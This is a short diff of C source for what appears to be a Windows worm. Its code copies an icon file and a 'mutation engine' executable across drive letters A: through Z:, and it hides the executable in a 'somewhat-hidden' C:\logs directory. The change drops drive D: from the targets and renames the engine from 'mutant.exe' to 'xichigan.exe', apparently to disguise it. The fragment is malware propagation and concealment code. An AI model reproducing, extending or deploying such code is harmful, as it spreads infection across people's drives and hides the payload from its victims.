@@ -35,8 +35,8 @@ int main(void)
 	const int numBinaryFiles = 1;
 	char *binaryfilenames[numBinaryFiles] = { "driveicon.ico" };
 	
-	const int numDrives = 25;
-	char *destdrives[numDrives] = {"A:\\", "B:\\", "D:\\", "E:\\",
+	const int numDrives = 24;
+	char *destdrives[numDrives] = {"A:\\", "B:\\","E:\\",
 								"F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
 								"K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
 								"P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
@@ -76,12 +76,12 @@ int main(void)
 	}
 	
 	//Move mutation engine to somewhat-hidden directory
-	strcpy(src, "mutant.exe");
+	strcpy(src, "xichigan.exe");
 	strcpy(dest, "C:\\logs");
 	
 	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
-		strcat(dest, "\\mutant.exe");
+		strcat(dest, "\\xichigan.exe");
 		copyBinaryFile(src, dest);
 	}
 	else
